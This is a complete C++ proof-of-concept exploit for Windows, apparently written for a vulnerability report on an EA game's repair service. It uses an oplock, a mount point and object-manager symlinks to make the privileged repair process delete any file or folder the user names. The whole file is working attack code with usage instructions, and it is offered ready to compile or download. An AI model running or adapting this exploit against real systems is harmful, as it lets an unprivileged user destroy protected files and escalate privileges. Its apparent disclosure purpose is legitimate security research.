// EA_EOP_arbFileFolderDelete.cpp
// This code is for the Bug 3. You can copy this and paste to modify the code of this 
// https://github.com/thezdi/PoC/blob/master/FilesystemEoPs/FolderContentsDeleteToFolderDelete/FolderContentsDeleteToFolderDelete.cpp 
// you can use pre-compiled from drive link or you can compile it yourself

#include <Windows.h>
#include <iostream>
#include <iomanip>
#include "Win-Ops-Master.h"

OpsMaster op;

HANDLE hdir = NULL;
HANDLE hf = NULL;
std::wstring folder1path;
const wchar_t folder2path[] = L"C:\\test2";
const wchar_t exploitFileName[] = L"en_US_eula.rtf_DiP_Staged";
const wchar_t* targetPath;
bool isTargetFile = false;

void callback1()
{
    op.MoveFileToTempDir(hf);
    op.CreateMountPoint(
        std::wstring(L"\\??\\") + folder1path,
        L"\\RPC CONTROL\\");

    if (isTargetFile) {
        // If the target is a file, use CreateDosDeviceLink
        std::wstring linkName = std::wstring(L"\\RPC CONTROL\\") + exploitFileName;
        op.CreateDosDeviceLink(linkName.c_str(), targetPath);
    }
    else {
        // If the target is a folder, use CreateNativeSymlink
        std::wstring symlinkTarget = targetPath;
        symlinkTarget = symlinkTarget.substr(0, symlinkTarget.find_last_not_of(L'\\') + 1);
        symlinkTarget = std::wstring(L"\\??\\") + symlinkTarget + L"::$INDEX_ALLOCATION";
        std::wstring linkName = std::wstring(L"\\RPC CONTROL\\") + exploitFileName;
        op.CreateNativeSymlink(linkName.c_str(), symlinkTarget.c_str());
    }
}

int wmain(int argc, const wchar_t* argv[])
{
    auto usage = [&]() {
        std::wcerr << L"Usage:" << std::endl;
        std::wcerr << L" " << argv[0] << L" /targetfolder <target_dir_absolute> or" << std::endl;
        std::wcerr << L" " << argv[0] << L" /targetfile <target_file_absolute>" << std::endl;
        std::wcerr << std::endl;
        std::wcerr << L"The target dir is the folder that you want to delete, or the target file is the file that you want to delete." << std::endl;
        exit(1);
        };

    auto getArg = [&](int argi) {
        if (!(argi < argc))
        {
            usage();
            exit(1);
        }
        else
        {
            return argv[argi];
        }
        };

    targetPath = NULL;

    for (int argi = 1; argi < argc; argi++)
    {
        if (!_wcsicmp(argv[argi], L"/targetfolder"))
        {
            argi++;
            targetPath = getArg(argi);
            isTargetFile = false;
        }
        else if (!_wcsicmp(argv[argi], L"/targetfile"))
        {
            argi++;
            targetPath = getArg(argi);
            isTargetFile = true;
        }
        else
        {
            usage();
            exit(1);
        }
    }

    if (targetPath == NULL)
    {
        usage();
        exit(1);
    }

    const wchar_t* initialDeleteRoot = L"C:\\EOPtestfolder\\Feeding Frenzy 2\\Support\\eula"; // Set your fixed initial delete root here

    // Step 1: Delete the specific file
    const wchar_t fileToDelete[] = L"C:\\EOPtestfolder\\Feeding Frenzy 2\\Support\\eula\\en_US_eula.rtf";
    if (DeleteFileW(fileToDelete))
    {
        std::wcout << L"[+] Successfully deleted file: " << fileToDelete << std::endl;
    }
    else
    {
        std::wcerr << L"[-] Failed to delete file: " << fileToDelete << L" Error: " << GetLastError() << std::endl;
    }

    // Step 2: Remove the directory
    const wchar_t dirToRemove[] = L"C:\\EOPtestfolder\\Feeding Frenzy 2\\Support\\eula";
    if (RemoveDirectoryW(dirToRemove))
    {
        std::wcout << L"[+] Successfully removed directory: " << dirToRemove << std::endl;
    }
    else
    {
        std::wcerr << L"[-] Failed to remove directory: " << dirToRemove << L" Error: " << GetLastError() << std::endl;
    }

    folder1path = initialDeleteRoot;
    if (folder1path[folder1path.length() - 1] != L'\\')
    {
        folder1path += L"";
    }

    BOOL bCreateTargetDirSuccess = CreateDirectory(targetPath, NULL); // In case target dir doesn't exist, we'll create it
    if (bCreateTargetDirSuccess)
    {
        std::wcout << L"[+] Created target dir: " << targetPath << std::endl;
    }

    CreateDirectory(folder2path, NULL);

    RemoveDirectory(folder1path.c_str());

    hdir = op.OpenDirectory(folder1path.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, ALL_SHARING);

    std::wstring exploitFilePath = std::wstring(folder1path.c_str()) + L"\\" + exploitFileName;
    DeleteFileW(exploitFilePath.c_str());
    hf = op.OpenFileNative(exploitFilePath.c_str(), MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE, CREATE_ALWAYS);

    lock_ptr lk = op.CreateLock(hf, callback1);

    std::wcout << L"[+] Ready. Now Repair the game to delete contents of " << folder1path << L"." << std::endl;
   // std::wcout << L"[+] Ready. Now run the privileged process to delete contents of " << folder1path << L"." << std::endl;
    //std::wcout << L"[+] Or, for testing purposes, execute at an elevated command prompt: del /q " << folder1path << L"\\*" << std::endl;

    lk->WaitForLock(INFINITE);

    for (unsigned int i = 0; i < 50; i++)
    {
        Sleep(100);
        if (GetFileAttributesW(targetPath) == INVALID_FILE_ATTRIBUTES)
        {
            DWORD dwError = GetLastError();
            if (dwError == ERROR_FILE_NOT_FOUND)
            {
                std::wcout << L"[+] SUCCESS: Target deleted." << std::endl;

                // Remove the DOS device link if the target was a file
                if (isTargetFile) {
                    std::wstring linkName = std::wstring(L"\\RPC CONTROL\\") + exploitFileName;
                    if (op.RemoveDosDeviceLink(linkName.c_str())) {
                        std::wcout << L"[+] Successfully removed DOS device link." << std::endl;// << linkName << std::endl;
                    }
                    else {
                        std::wcerr << L"[-] Failed to remove DOS device link: " << linkName << L" Error: " << GetLastError() << std::endl;
                    }
                }

                RemoveDirectoryW(initialDeleteRoot);
                std::wcout << L"[+] Done." << std::endl;
                exit(0);
            }
        }
    }

    std::wcout << L"[-] FAIL: Target has not been deleted within the expected amount of time." << std::endl;
    RemoveDirectoryW(initialDeleteRoot);

    // Remove the DOS device link if the target was a file and deletion failed
    if (isTargetFile) {
        std::wstring linkName = std::wstring(L"\\RPC CONTROL\\") + exploitFileName;
        if (op.RemoveDosDeviceLink(linkName.c_str())) {
            std::wcout << L"[+] Successfully removed DOS device link: " << linkName << std::endl;
        }
        else {
            std::wcerr << L"[-] Failed to remove DOS device link: " << linkName << L" Error: " << GetLastError() << std::endl;
        }
    }
}
